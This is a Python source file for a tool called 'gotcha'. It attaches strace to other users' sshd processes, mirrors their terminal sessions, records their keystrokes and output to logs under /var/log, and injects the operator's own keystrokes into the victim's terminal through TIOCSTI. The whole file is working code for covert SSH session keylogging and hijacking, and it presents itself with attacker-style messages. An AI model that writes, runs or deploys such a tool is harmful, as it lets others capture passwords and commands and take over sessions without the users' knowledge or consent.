#!/usr/bin/python
"""gotcha.py
"""
__updated__ = "2022-10-08 20:57:34"


import termios
import fcntl
import sys
import os
import re
import json
import time
import glob
import struct
from typing import Any, List

from threading import Thread
from dataclasses import dataclass
from subprocess import Popen, PIPE

from gotcha.ascii import SPECIAL_KEYS_DICT

PS_UTIL = False
try:
    # psutil is a cross-platform library for retrieving information on
    # running processes and system utilization (CPU, memory, disks, network,
    # sensors) in Python. Supported platforms
    import psutil

    PS_UTIL = True
except ImportError as _:
    pass


def eprint(*args, **kwargs):
    """_summary_"""
    print(*args, file=sys.stderr, **kwargs)


def eeprint(*args, **kwargs):
    """_summary_"""
    return_code = 1
    if "return_code" in kwargs:
        return_code = kwargs["return_code"]
        del kwargs["return_code"]
    print(*args, file=sys.stderr, **kwargs)
    sys.exit(return_code)


def ansi_escape_8(sometext: any) -> bytes:
    """
    ansi_escape_8(self, string_escape)
    """
    # 7-bit and 8-bit C1 ANSI sequences
    ansi_escape_8bit = re.compile(
        rb"(?:\x1B[@-Z\\-_]|[\x80-\x9A\x9C-\x9F]|(?:\x1B\[|\x9B)[0-?]*[ -/]*[@-~])"
    )
    return ansi_escape_8bit.sub(b"", sometext)


def string_escape(string: any, encoding="utf-8") -> any:
    """
    * To bytes, required by 'unicode-escape'
    * Perform the actual octal-escaping decode
    * 1:1 mapping back to bytes
    * Decode original encoding
    """
    encode = ""
    try:
        encode = (
            string.encode("latin-1")
            .decode("unicode-escape")
            .encode("latin-1")
            .decode(encoding)
        )
    except UnicodeDecodeError:
        encode = string
    return encode


_exec_timestamp = time.strftime("%Y-%m-%d-%H%M", time.localtime())


@dataclass
class GotchaArgs:
    """_summary_
    """
    session_files: int = 1
    verbose: bool = False
    quiet: bool = False
    list: bool = False
    tty: str = 'auto'
    auto: bool = False
    replay: str = ''
    speed: int = 1


@dataclass
class GotchaTTY:
    """_summary_"""

    pid = None
    tty: str = ''
    play = False
    working = True

    now = 0.0
    line_play = 0.0
    elapsed_time = 0.0

    # keys-%Y-%m-%d-%H%M.gotcha.log
    keystrokes_file = f"/var/log/keys-{_exec_timestamp}.gotcha.log"
    # sess-%Y-%m-%d-%H%M.gotcha.log
    session_file = f"/var/log/sess-{_exec_timestamp}.gotcha.log"

    def __get_pid_of_tty(self, tty: any) -> any:
        """
        __get_pid_of_tty(self, tty: any) return any
        """
        _ = tty.replace("/dev/", "")
        proc = [
            i for i in os.popen("ps -ef").read().split("\n") if _ in i and "sshd:" in i
        ]

        if proc:
            pid = re.findall(r"^[^ ]+ +([0-9]+)", proc[0])[0]
            return str(int(pid))

        return False

    def __tty_list(self) -> List:
        """Get self tty

        Returns:
            list:  [('pts/5', 'user')]
        """
        ttys = None
        #
        current_tty = os.ttyname(sys.stdout.fileno()).replace("/dev/", "")

        # Get active ssh connections
        if PS_UTIL:
            ttys = [
                (i.terminal, i.name)
                for i in psutil.users()
                if "/" in i.terminal and not current_tty == i.terminal
            ]
        else:
            ttys = [
                (t.split()[1], t.split()[0])
                for t in os.popen("last").read().split("\n")
                if "logged" in t and "/" in t and not t.split()[1] == current_tty
            ]
        return ttys

    def _gotcha_tty(self, _args: any = (0,)) -> None:
        """
        # Attach to sshd process and mirror all read() syscalls to our stdout
        """
        with Popen(
            ["strace", "-s", "16384", "-p", self.pid, "-e", "read,write", "-q"],
            shell=False,
            stdout=PIPE,
            stderr=PIPE,
        ) as sshpipe:

            # Create output files.
            # keys-%Y-%m-%d-%H%M.gotcha.log
            if not os.path.isfile(self.session_file):
                open(self.session_file, "w").close()  # pylint: disable=unspecified-encoding

            # sess-%Y-%m-%d-%H%M.gotcha.log
            if not os.path.isfile(self.keystrokes_file):
                open(self.keystrokes_file, "w").close()  # pylint: disable=unspecified-encoding

            with open(self.keystrokes_file, "a") as _fo:  # pylint: disable=unspecified-encoding
                _fo.write(f"{time.ctime()} {self.tty} {self.pid}:\n\n")

            _fdr = ""

            while self.working:
                try:
                    sshpipe.poll()

                    output = sshpipe.stderr.readline()

                    # output = str(self.ansi_escape_8(output), "utf-8")
                    output = str(output, "utf-8")

                    self.now = time.time()

                    # lPlay
                    if self.line_play:
                        self.elapsed_time = self.now - self.line_play

                    # read
                    if "read(" + _fdr in output:

                        # Firstly, we need to find out target tty's stdout file descriptor,
                        # so we will send ' ' then backspace to the target tty and get the output
                        # Need to find more elegant way to do it.
                        if not _fdr:
                            _fdl = re.findall(
                                r"read\(([0-9]+), \".{1}\", 16384\) += 1", output
                            )
                            if isinstance(_fdl, list) and len(_fdl):
                                _fdr = _fdl[0]
                                eprint(f"[+] Target TTY keystrokes file: {self.keystrokes_file}")
                                eprint(f"[+] Target TTY session file: {self.session_file}")
                                eprint(f"\n[+] Attached to {self.tty} <stdout> file descriptor!")
                                eprint("[*] Let's Rock!!!\n")
                                eprint(f"[!] WARNING: Be careful, know your input is mirrored to {self.tty}!")
                                eprint("[!] Press Ctrl+C to exit observed session!")
                        else:
                            self.write_session_file(output)

                    # write
                    elif "write(" in output:
                        self.write_keys(output)

                    # end of session
                    elif not output and sshpipe.returncode is not None:
                        eprint("-------------------")
                        eprint("[!] End of session.")
                        self.working = False
                        break

                    # To prevent exception (BlockingIOError) when execute Bash While Loop
                    # e.g. $ while true; do echo "boom!"; done
                    time.sleep(0.01)

                except (BlockingIOError, Exception) as error:  # pylint: disable=broad-except
                    # BlockingIOError: [Errno 11] write could not complete without blocking
                    eprint(f"BlockingIOError: {error}")
                    self.working = False

    def _get_keystrokes(self, _args: any) -> None:
        """
        # Thanks to enrico.bacis - https://stackoverflow.com/a/13207724
        """
        try:

            _fd = sys.stdin.fileno()
            oldterm = termios.tcgetattr(_fd)

            newattr = termios.tcgetattr(_fd)
            newattr[3] = newattr[3] & ~termios.ICANON & ~termios.ECHO
            termios.tcsetattr(_fd, termios.TCSANOW, newattr)

            oldflags = fcntl.fcntl(_fd, fcntl.F_GETFL)
            fcntl.fcntl(_fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)

            try:

                # Type ' ' and backspace to get first data, otherwise if
                # no data received - the program will terminate
                with open(self.tty) as _fi:
                    for temp in [" ", "\x7f", "\r", "\n"]:  # '\x7f','\n']:
                        fcntl.ioctl(_fi, termios.TIOCSTI, temp)
                        time.sleep(0.05)

                while self.working:
                    try:
                        cmd = sys.stdin.readline(1)
                        with open(self.tty) as _f:
                            match cmd:
                                # # Catch Ctrl+P and send hooking message
                                case "\x1f":
                                    cmd = "\x03"

                                # forwarding Ctrl+D, this will logout the observed ssh session.
                                case "\x04":
                                    eprint("\n[!] GOTCHA: forwarding Ctrl+D, this will logout the observed ssh session!")
                                    eprint("\nSee you!")
                                    self.working = False
                                # # Help Ctrl+H
                                # case "\x08":
                                #     self.help()
                                #
                                # tweak for some apps that won't catch \n as Enter key
                                # case "\n":
                                    # cmd = "\r\n"

                            # tweak for catch keys
                            if cmd:
                                command = (
                                    struct.pack("B", cmd) for cmd in os.fsencode(cmd)
                                )
                                for cmd in command:
                                    fcntl.ioctl(_f, termios.TIOCSTI, cmd)
                    except IOError:
                        pass

            finally:
                termios.tcsetattr(_fd, termios.TCSAFLUSH, oldterm)
                fcntl.fcntl(_fd, fcntl.F_SETFL, oldflags)

        except FileNotFoundError as _error:
            self.working = False
            sys.exit(1)

    def attach(self, tty: str) -> None:
        """
            Lazy mode, auto-attach to first found session
        """
        try:
            if "auto" in tty:
                _ = self.__tty_list()
                if len(_) >= 1:
                    self.tty = f"/dev/{_[0][0]}"
            elif "/dev/" in tty:
                self.tty = tty

            if self.tty:
                self.pid = self.__get_pid_of_tty(self.tty)

            if not self.pid or os.path.isdir(self.tty):
                self.working = False
                eeprint(f"[-] TTY {self.tty} does not exists!\n")

            eprint(f"[+] Attaching to {self.pid} at {self.tty}...\n")

            thr_gotcha_tty = Thread(target=self._gotcha_tty, args=(0,))
            thr_gotcha_tty.start()

            time.sleep(1)

            thr_get_keystrokes = Thread(target=self._get_keystrokes, args=(0,))
            thr_get_keystrokes.start()

            thr_gotcha_tty.join()
        except KeyboardInterrupt:
            eprint("\n\n[!] Ctrl+C detected...\nSee you!\n")

    def list(self) -> None:
        """_summary_
        """
        eprint(f"{'USER':<10} {'PID':<10} {'TTY':<10}")
        for _t, _u in self.__tty_list():
            eprint(f"{_u:<10} {self.__get_pid_of_tty(_t):<10} {'/dev/'+_t:<10}")

    def replay(self, session: str = None) -> None:
        """_summary_"""
        try:
            if session:
                self.session_file = f"/var/log/{session}"
            else:
                lst_files = glob.glob("/var/log/*sess*.log")
                lst_files.sort(key=os.path.getmtime)
                self.session_file = lst_files[-1]

            session_file = f"Replay of session {self.session_file}"
            eprint(session_file)
            eprint("-" * len(session_file))

            for line in open(self.session_file):  # pylint: disable=unspecified-encoding
                try:
                    _d = json.loads(line)
                    now = float(_d["d"])
                    timeout = float(now) / 12  # self.speed
                    # we don't want to wait more than 10 seconds to see what happens next
                    if timeout > 60:
                        timeout = 10
                    time.sleep(timeout)
                    sys.stdout.write(_d["v"])
                    sys.stdout.flush()
                except KeyboardInterrupt:
                    eprint("\n\n[!] Ctrl+C detected...\nSee you!\n")
                    break

            eprint("\n\nEnd of session replay.\n")
        except FileNotFoundError as error:
            eeprint(error)

    def write_keys(self, output="") -> None:
        """
        write_keys(self, output=""):
        """
        out = re.findall(r"write\([0-9]+, \"(.*)\", [0-9]+\) += 1$", output)

        pchar = ""
        if isinstance(out, list) and len(out):
            pchar = out[0]

        if SPECIAL_KEYS_DICT.get(pchar):
            # Replace special keys to readable values in output file
            pchar = SPECIAL_KEYS_DICT[pchar]

        with open(self.keystrokes_file, "a") as _fi:  # pylint: disable=unspecified-encoding
            _fi.write(pchar)

    def write_session_file(self, output="") -> None:
        """
        write_session_file(diff, now, output="")
        """
        out = re.findall(r"read\([0-9]+, \"(.*)\", 16384\) += [0-9]+", output)
        pchar = ""
        if isinstance(out, list) and len(out):
            pchar = string_escape(out[0])

        sys.stdout.write(pchar)
        sys.stdout.flush()

        self.line_play = self.now
        with open(self.session_file, "a", encoding="utf-8") as fsess:
            odict = {"d": f"{ self.elapsed_time:0.2f}", "v": pchar}
            fsess.write(json.dumps(odict) + "\n")

    def session_list(self, columns: int = 3) -> Any:
        """
            session_list
        """
        lst_files = glob.glob("/var/log/*sess*.log")
        lst_files.sort(key=os.path.getmtime)

        lst = []
        for path in lst_files:
            head_tail = os.path.split(path)
            lst.append(head_tail[1])

        match columns:
            case 3:
                for first, second, third in zip(lst[::columns], lst[1::columns], lst[2::columns]):
                    eprint(f"{first: <10}   {second: <10}   {third}")
            case 2:
                for first, second in zip(lst[::columns], lst[1::columns]):
                    eprint(f"{first: <10}   {second: <10}")
            case 1:
                [eprint(l) for l in lst]  # pylint: disable=expression-not-assigned

    def send_key(self, key: str, tty: any) -> None:
        """
        send_key
        """
        with open(tty, "w") as _tty:  # pylint: disable=unspecified-encoding
            _tty.write(key)
            _tty.close()
